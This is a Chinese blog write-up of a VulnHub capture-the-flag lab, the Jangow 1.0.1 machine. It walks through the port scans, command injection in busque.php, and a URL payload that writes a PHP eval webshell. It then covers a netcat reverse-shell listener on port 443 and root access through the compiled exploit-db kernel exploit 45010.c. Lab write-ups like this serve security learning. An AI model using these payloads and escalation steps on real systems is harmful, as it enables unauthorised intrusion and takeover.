---
layout: post
title: "打靶笔记-04-vulnhub-Jangow"
date: "2022-03-18T02:48:19.913Z"
---
打靶笔记-04-vulnhub-Jangow
======================

打靶笔记-04-vulnhub-Jangow
======================

前面两篇名称写成了vulhub，已经更改为vulnhub;vulhub的之后再找个时间集中打一遍。

一、靶机信息
------

    Name: Jangow: 1.0.1 （Easy）
    Date release: 4 Nov 2021
    Author: Jangow
    Series: Jangow
    

二、启动靶机
------

### 2.1 校验靶机

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210836364-3097576.png)

### 2.2 导入Vbox，配置网络

因为攻击机器都在vmware上，所以还是将靶机网络桥接到vmnet8网卡上。  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210836839-143033956.png)

### 2.3 打快照，启动靶机

没啥好说的，以防万一，打个快照启动  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210837079-374480694.png)  
可以直接看到ip地址，不过按照实际中的话时看不到这个界面的。

三、开始打靶
------

### 3.1 信息搜集

#### 3.1.1 主机发现

    ifconfig
    sudo arp-scan -I eth0 -l
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210837479-423335742.png)  
**获得靶机IP 172.16.95.140**

#### 3.1.2 端口发现

    sudo nmap -p- 172.16.95.140
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210837772-1956900124.png)  
**只开放22和80端口**

#### 3.1.3 进一步确认端口背后服务以及具体版本号

    sudo nmap -sV -p22,80 172.16.95.140
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210838037-1465736624.png)  
可以看到22端口是filtered的状态，也就是**22端口被防火墙过滤了**，80端口对应的是**Apache httpd 2.4.18**

#### 3.1.4 使用nmap默认脚本扫描

    sudo nmap -sC -p22,80 172.16.95.140
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210838352-1300681188.png)  
貌似没有啥发现，80端口也挂载的是普通页面，先看看去

### 3.2 开始渗透

#### 3.2.1 访问80端口

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210838565-427021267.png)  
是个目录，继续点，发现是个网页，然后里面有一个**目录链接site**，继续点  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210838995-2115185012.png)  
最后发现个链接指向一个**busque.php文件**，并且拥有**参数buscar**可以接收值，但不知道干啥用的，最后经过fuzz测试，确定为**命令执行**  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210839337-750241912.png)

#### 3.2.2 信息收集

既然是命令执行，那就可以直接来一波简单的信息收集

    id
    pwd
    ls
    ls ./wordpress
    cat ./wordpress
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210839632-1354438611.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210839869-2121172400.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210840094-351422029.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210840302-2057537989.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210840533-542423064.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210840843-700263617.png)  
在进行常规信息搜集后，发现有一个**wordpress的目录**，并且还获取到了**数据库账**  
不过以上好像没啥用，数据库也无法访问，也没有更多有用的目录。

#### 3.2.3 写入小马

因为命令执行，所以尝试了各种姿势反弹shell，可能是水平不够，wget也无法下载到远程服务器上的马儿，所以就开始尝试写入小马

    http://172.16.95.140/site/busque.php?buscar=echo%20%27%3C?php%20@eval($_POST[%27ant%27]);?%3E%27%20%3E1.php
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210841208-699573302.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210841426-456709202.png)  
成功写入，上蚁剑，连接成功  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210841674-1673815809.png)  
继续收集信息，获得用户**jangow01**家目录下有个**user.txt**，内容似乎是md5加密的，可以顺手破解一下，不过好像是空的，没有任何内容，奇怪  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210841906-581166986.png)  
翻了翻其他目录在**html目录下发现.backup文件**，里面是**用户jangow01的mysql账户密码**  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210842140-1635929757.png)

然后尝试上传反弹shell的php文件也无法反弹成功

#### 3.2.4 反弹shell

蚁剑虽然连接成功了，但是shell最终还是个webshell，可干的事儿有限，所以还是的反弹shell提权  
经历过刚刚命令执行反弹shell失败，然后尝试上传反弹shell的php文件也失败了，联想刚开始端口扫描时22端口被过滤的情况，应该是目标机器防火墙搞得鬼。  
不过好在**目标机器nc可以使用**，不过最终也没有反弹成功，因为它无法带-e参数。  
\=-=  
打到这儿自己就没思路了，最后查看了别人的攻略，这儿的关键点在于目标机器防火墙对进出的端口进行了限制，最后尝试了443端口可以成功利用

    nc -lvnp 443
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210842410-1062711456.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210842778-990603022.png)

#### 3.2.5 升级shell为tty

    which python python2 python3 py py2 py3
    python -c 'import pty;pty.spawn("/bin/bash")';
    export TERM=xterm-256color
    stty raw -echo;fg
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210843172-1570897021.png)

#### 3.2.6 寻找漏洞提权

升级shell之后，就可以sudo和su了，结合之前发现的两个mysql账户名密码，尝试了以下切换用户，结果mysql的账户密码和系统的账户密码一致。  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210843540-612641622.png)  
然后尝试sudo的时候失败了，好像不是英文，不过看到了个sudoer，猜测应该是提示这个用户不再sudoer文件中，也就是没有sudo的权限。

那就看看有没有其他漏洞可以利用吧

    uname -r
    uname -a
    lsb_release -a
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210843754-1595959295.png)  
**ubuntu的版本为16.04.1 LTS**

    searchsploit Linux Kernel 4.4.
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210844193-289444949.png)  
这个搜索到的有很多看着比较符合，不过这个有点意思的是有个在windows的分类下，有点奇怪，先拿它看看

    sudo cp /usr/share/exploitdb/exploits/windows_x86-64/local/47170.c /var/www/html/test.c
    
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210844522-1380909525.png)  
然后在目标机器上下载test.c，结果都无法搞定，应该是对方防火墙导致的。  
\=-=，一会儿提权成功一定要看下它的防火墙策略，最后通过蚁剑传了过去，不过gcc编译失败了  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210844803-99181733.png)  
**继续换linux/local/45010.c**

    sudo cp /usr/share/exploitdb/exploits/linux/local/45010.c ./ 
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210845063-760841653.png)  
然后还是通过蚁剑上传编译执行，最后成功拿到root权限

    ls
    gcc -o exp 45010.c
    chmod +x exp
    ./exp
    id
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210845344-502962021.png)

### 3.2.7 查看防火墙

    bash
    sudo ufw status
    

果然，=-=，禁止访问任何端口，除了443  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210845639-2052487625.png)  
关闭防火墙，可以成功访问，真变态  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210845927-2080284273.png)

四、总结
----

这个靶机难点就是能够找到唯一可利用的443端口进行反弹shell，没有这个端口，有再多的反弹姿势，防火墙拦截的死死的，除非能用webshell进行本地提权，这个不现实，至少对我来说是的，能力不够  
然后看到别人有批量提权的脚本，先记录下，随后的靶机中尝试以下  
**[linux 提权辅助脚本](https://github.com/jondonas/linux-exploit-suggester-2)**  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220317210846236-407436508.png)  
敖～，果然特么神器=-=  
原谅我这个菜鸡现在才找到这些神器，应该在自己犯懒的时候先找下有没有懒人神器，没有的话自己总结搞一个，加油～～～

本文来自博客园，作者：[WTHusky](https://www.cnblogs.com/wthuskyblog/)，转载请注明原文链接：[https://www.cnblogs.com/wthuskyblog/p/16019185.html](https://www.cnblogs.com/wthuskyblog/p/16019185.html)